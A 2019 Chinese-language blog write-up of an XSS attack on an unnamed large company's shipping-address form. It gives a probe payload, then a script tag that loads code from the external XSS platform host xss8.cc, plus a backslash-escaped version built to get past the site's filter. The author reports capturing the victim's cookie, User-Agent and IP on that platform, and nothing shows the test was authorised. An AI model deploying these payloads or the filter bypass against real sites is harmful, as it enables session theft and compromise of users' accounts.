---
title: 【渗透实例】记录一次XSS渗透过程
date: 2019-07-03 22:19:56
id: 190703-221956
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xss1.png
tags:
- 渗透实例
- XSS
categories:
- 渗透实例
---

# 0x01 找到存在XSS的位置
没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。
<!--more-->
```
使用的XSS代码：<img src=1 onerror=alert(1)>
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xss1.png)
# 0x02 构造XSS代码连接到XSS平台
XSS平台给我们的XSS代码是这样的：
```
</tExtArEa>'"><sCRiPt sRC=https://xss8.cc/3Ri4></sCrIpT>
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xss2.png)
直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:
```
</tExtArEa>'\"><\sCRiPt sRC=https://xss8.cc/3Ri4></\sCrIpT>
```
这条代码比上面平台给的XSS代码的多了几个 "\"，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xss3.png)
加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xss4.png)
这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。
并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)